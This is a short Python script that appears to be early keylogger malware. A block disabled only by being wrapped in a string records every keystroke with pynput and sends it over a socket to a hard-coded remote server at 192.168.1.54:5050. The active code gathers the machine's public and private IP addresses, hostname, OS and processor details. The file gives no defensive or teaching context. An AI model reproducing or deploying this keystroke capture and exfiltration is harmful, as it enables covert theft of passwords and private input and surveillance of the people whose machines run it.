import socket
import sys
import platform
from pynput import keyboard
from requests import get

'''
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

IP = "192.168.1.54"  
PORT = 5050  
print('Initializing connection with server')
soc.connect((IP, PORT))  

msg = '\n'
def on_press(key):  
    global msg
    print("Key pressed:", key)
    if key != keyboard.Key.enter:
        msg += str(key)
    else:
        soc.send(msg.encode('utf-8'))
        msg = '\n'

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
'''
msg = ''
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
try:
    public_ip = get("https://api.ipify.org").text
    msg += ("Public IP Address: " + public_ip + "\n")

except Exception:
    msg +=("Couldn't get Public IP Address (most likely max query")

msg +=("Processor: " + (platform.processor()) + '\n')
msg +=("System: " + platform.system() + " " + platform.version() + '\n')
msg +=("Machine: " + platform.machine() + "\n")
msg +=("Hostname: " + hostname + "\n")
msg +=("Private IP Address: " + IPAddr + "\n")

print(msg)